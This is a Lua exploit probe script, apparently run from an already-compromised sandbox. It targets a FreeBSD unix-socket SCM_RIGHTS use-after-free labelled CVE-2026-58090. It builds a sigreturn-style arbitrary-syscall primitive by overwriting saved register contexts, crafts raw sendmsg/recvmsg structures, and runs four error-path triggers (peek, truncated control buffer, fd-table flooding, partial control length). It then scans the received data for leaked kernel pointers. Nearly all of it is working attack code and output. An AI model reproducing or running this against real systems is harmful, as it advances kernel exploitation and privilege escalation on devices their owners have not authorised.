-- CRASH_CLASS: MODERATE
-- PROBE 151a: CVE-2026-58090 unix SOCK_STREAM SCM_RIGHTS UAF test
--
-- FreeBSD-SA-26:57.unix: receive path fails to fully detach control
-- messages from socket buffer before processing. Error paths free the
-- messages but leave freed mbufs in the receive buffer.
--
-- Trigger: cause an error during SCM_RIGHTS receive:
-- 1. Fill fd table to near limit, then receive SCM_RIGHTS (EMFILE)
-- 2. Receive with truncated control buffer (MSG_CTRUNC)
-- 3. MSG_PEEK then normal receive (double-process)
-- 4. Partial receive leaving cmsg in buffer
-- 5. Check for kernel pointers in freed/stale mbuf data

print("=== PROBE 151a: CVE-58090 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Helper: build sendmsg with SCM_RIGHTS
local function send_fd(sock, fd_to_send, data_byte, mhdr_off, iov_off, cmsg_off, iobuf_off)
    wd(gpu + iobuf_off, data_byte)
    wq(gpu + iov_off, ga(iobuf_off))
    wq(gpu + iov_off + 8, uint64(1))
    for off = 0, 31, 4 do wd(gpu + cmsg_off + off, 0) end
    wd(gpu + cmsg_off, 20)
    wd(gpu + cmsg_off + 4, 0xFFFF)
    wd(gpu + cmsg_off + 8, 1)
    wd(gpu + cmsg_off + 16, fd_to_send)
    wq(gpu + mhdr_off, uint64(0))
    wd(gpu + mhdr_off + 8, 0)
    wq(gpu + mhdr_off + 0x10, ga(iov_off))
    wd(gpu + mhdr_off + 0x18, 1)
    wq(gpu + mhdr_off + 0x20, ga(cmsg_off))
    wd(gpu + mhdr_off + 0x28, 24)
    wd(gpu + mhdr_off + 0x30, 0)
    return srop(28, uint64(sock), ga(mhdr_off), uint64(0))
end

-- Helper: recvmsg with given controllen and flags
local function recv_msg(sock, controllen, flags, mhdr_off, iov_off, cmsg_off, iobuf_off)
    wq(gpu + iobuf_off, uint64(0))
    wq(gpu + iov_off, ga(iobuf_off))
    wq(gpu + iov_off + 8, uint64(64))
    for off = 0, math.max(controllen, 64) - 1, 4 do
        if off < 256 then wd(gpu + cmsg_off + off, 0xDEADDEAD) end
    end
    wq(gpu + mhdr_off, uint64(0))
    wd(gpu + mhdr_off + 8, 0)
    wq(gpu + mhdr_off + 0x10, ga(iov_off))
    wd(gpu + mhdr_off + 0x18, 1)
    wq(gpu + mhdr_off + 0x20, ga(cmsg_off))
    wd(gpu + mhdr_off + 0x28, controllen)
    wd(gpu + mhdr_off + 0x30, 0)
    return srop(27, uint64(sock), ga(mhdr_off), uint64(flags))
end

-- [A] Test: MSG_PEEK then normal receive (double-process cmsg)
print("--- [A] PEEK+RECV ---")
local sv = gpu + 0x1000
wq(sv, uint64(0))
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    -- Create test fd
    local nm = gpu + 0x2000
    wd(nm, 0x70732F) -- "/sp"
    wd(nm + 4, 0x00003031) -- "01\0"
    local tfd_r = srop(482, ga(0x2000), uint64(0x0202), uint64(0x1B6))
    local tfd = tfd_r and to_num(tfd_r) or -1
    print("test_fd=" .. tfd)

    if tfd >= 0 then
        -- Send SCM_RIGHTS
        local sr = send_fd(s0, tfd, 0x41, 0x3000, 0x3100, 0x3200, 0x3300)
        print("send=" .. (sr and tostring(to_num(sr)) or "nil"))

        -- MSG_PEEK first (flag 0x2)
        local pr = recv_msg(s1, 64, 2, 0x4000, 0x4100, 0x4200, 0x4300)
        local prv = pr and to_num(pr) or -1
        print("peek=" .. prv)

        -- Check what PEEK returned in cmsg
        local peek_len = to_num(memory.read_dword(gpu + 0x4200))
        local peek_fd = to_num(memory.read_dword(gpu + 0x4210))
        print("peek_cmsg_len=" .. peek_len .. " peek_fd=" .. peek_fd)

        -- Check returned flags
        local peek_flags = to_num(memory.read_dword(gpu + 0x4000 + 0x30))
        print("peek_msg_flags=0x" .. string.format("%X", peek_flags))

        -- Close the peeked fd if valid
        if peek_fd > 0 and peek_fd < 256 and peek_fd ~= 0xDEADDEAD then
            srop(6, uint64(peek_fd))
            print("closed_peek_fd=" .. peek_fd)
        end

        -- Normal receive (message should still be there)
        local nr = recv_msg(s1, 64, 0, 0x5000, 0x5100, 0x5200, 0x5300)
        local nrv = nr and to_num(nr) or -1
        print("recv=" .. nrv)

        local recv_len = to_num(memory.read_dword(gpu + 0x5200))
        local recv_fd = to_num(memory.read_dword(gpu + 0x5210))
        print("recv_cmsg_len=" .. recv_len .. " recv_fd=" .. recv_fd)

        -- Check for stale/kernel data in cmsg
        for off = 0, 60, 4 do
            local v = to_num(memory.read_dword(gpu + 0x5200 + off))
            if v ~= 0xDEADDEAD and v ~= 0 then
                local h = math.floor(v / 0x10000)
                if h >= 0xFFFF then
                    print("  *** SUSPICIOUS +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                end
            end
        end

        -- Scan recv cmsg for kernel pointers (8-byte aligned)
        for off = 0, 56, 8 do
            local ok2, v = pcall(function() return memory.read_qword(gpu + 0x5200 + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR cmsg+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end

        if recv_fd > 0 and recv_fd < 256 and recv_fd ~= 0xDEADDEAD then
            srop(6, uint64(recv_fd))
        end

        srop(483, ga(0x2000))
        srop(6, uint64(tfd))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [B] Truncated control buffer (MSG_CTRUNC trigger)
print("")
print("--- [B] CTRUNC ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    -- Create test fd
    local prd_r = srop(42)
    local prd = prd_r and to_num(prd_r) or -1

    if prd >= 0 then
        -- Send SCM_RIGHTS with pipe fd
        send_fd(s0, prd, 0x42, 0x6000, 0x6100, 0x6200, 0x6300)

        -- Receive with controllen=0 (too small for cmsg)
        local cr = recv_msg(s1, 0, 0, 0x7000, 0x7100, 0x7200, 0x7300)
        local crv = cr and to_num(cr) or -1
        print("recv_trunc=" .. crv)
        local cflags = to_num(memory.read_dword(gpu + 0x7000 + 0x30))
        print("msg_flags=0x" .. string.format("%X", cflags))
        -- MSG_CTRUNC = 0x20
        if cflags >= 0x20 then
            print("*** MSG_CTRUNC SET ***")
        end

        -- Now read the socket again — any stale cmsg data?
        -- Send another byte (no cmsg) to have something to receive
        local byte = gpu + 0x8000
        wd(byte, 0x43)
        srop(4, uint64(s0), ga(0x8000), uint64(1))

        local cr2 = recv_msg(s1, 128, 0, 0x9000, 0x9100, 0x9200, 0x9300)
        local cr2v = cr2 and to_num(cr2) or -1
        print("recv_after=" .. cr2v)

        -- Check for stale cmsg in the buffer
        local rctl = to_num(memory.read_dword(gpu + 0x9000 + 0x28))
        print("controllen_after=" .. rctl)

        -- Scan for kernel pointers
        for off = 0, 124, 8 do
            local ok2, v = pcall(function() return memory.read_qword(gpu + 0x9200 + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR after_trunc+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end

        srop(6, uint64(prd))
        srop(6, uint64(prd + 1))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [C] Fill fd table then receive SCM_RIGHTS (EMFILE trigger)
print("")
print("--- [C] FD FLOOD ---")

-- First, find current fd count by opening pipes until failure
local opened_fds = {}
local max_attempts = 200

for i = 1, max_attempts do
    local fr = srop(42) -- pipe returns read fd
    local fv = fr and to_num(fr) or -1
    if fv <= 0 or fv > 4096 then
        print("fd_limit_hit at attempt " .. i .. " (last fd=" .. (opened_fds[#opened_fds] or "none") .. ")")
        break
    end
    opened_fds[#opened_fds + 1] = fv
    opened_fds[#opened_fds + 1] = fv + 1 -- write end
end
print("opened=" .. #opened_fds .. " fds")

if #opened_fds > 10 then
    -- Create socketpair with remaining fds
    wq(sv, uint64(0))
    local sp3 = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
    if sp3 and to_num(sp3) == 0 then
        local s0 = to_num(memory.read_dword(sv))
        local s1 = to_num(memory.read_dword(sv + 4))
        print("pair=" .. s0 .. "," .. s1)

        -- Send SCM_RIGHTS (the fd table is nearly full)
        local sr = send_fd(s0, opened_fds[1], 0x44, 0xA000, 0xA100, 0xA200, 0xA300)
        print("send_full=" .. (sr and tostring(to_num(sr)) or "nil"))

        -- Try to receive — should get EMFILE or similar error
        local rr = recv_msg(s1, 64, 0, 0xB000, 0xB100, 0xB200, 0xB300)
        local rrv = rr and to_num(rr) or -1
        print("recv_full=" .. rrv)

        local rflags = to_num(memory.read_dword(gpu + 0xB000 + 0x30))
        print("msg_flags=0x" .. string.format("%X", rflags))

        -- Check cmsg area for leaked kernel data
        for off = 0, 60, 8 do
            local ok2, v = pcall(function() return memory.read_qword(gpu + 0xB200 + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR emfile+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end

        -- Send another message and receive it — check for stale cmsg from failed receive
        wd(gpu + 0xC000, 0x45)
        srop(4, uint64(s0), ga(0xC000), uint64(1))

        -- Close some fds to make room
        for i = 1, 4 do
            if opened_fds[i] then srop(6, uint64(opened_fds[i])) end
        end

        local rr2 = recv_msg(s1, 128, 0, 0xD000, 0xD100, 0xD200, 0xD300)
        local rr2v = rr2 and to_num(rr2) or -1
        print("recv_after_free=" .. rr2v)

        -- Scan for kernel pointers in post-free receive
        for off = 0, 124, 8 do
            local ok2, v = pcall(function() return memory.read_qword(gpu + 0xD200 + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR post_free+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end

        srop(6, uint64(s0))
        srop(6, uint64(s1))
    end
end

-- Close all opened fds
for _, fd in ipairs(opened_fds) do
    srop(6, uint64(fd))
end

-- [D] Receive with controllen=4 (between 0 and CMSG_LEN)
print("")
print("--- [D] PARTIAL CTL ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    local tfd_r = srop(42)
    local tfd = tfd_r and to_num(tfd_r) or -1

    if tfd >= 0 then
        send_fd(s0, tfd, 0x46, 0xE000, 0xE100, 0xE200, 0xE300)

        -- Receive with various too-small controllen values
        local sizes = {4, 8, 12, 16, 19}
        for _, sz in ipairs(sizes) do
            -- Re-send if needed (first iteration uses the one already sent)
            if sz > 4 then
                send_fd(s0, tfd, 0x46 + sz, 0xE000, 0xE100, 0xE200, 0xE300)
            end

            local pr = recv_msg(s1, sz, 0, 0xF000, 0xF100, 0xF200, 0xF300)
            local prv = pr and to_num(pr) or -1
            local pflags = to_num(memory.read_dword(gpu + 0xF000 + 0x30))
            local pctl = to_num(memory.read_dword(gpu + 0xF000 + 0x28))
            print("ctl=" .. sz .. " recv=" .. prv .. " flags=0x" .. string.format("%X", pflags) .. " rctl=" .. pctl)
        end

        srop(6, uint64(tfd))
        srop(6, uint64(tfd + 1))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
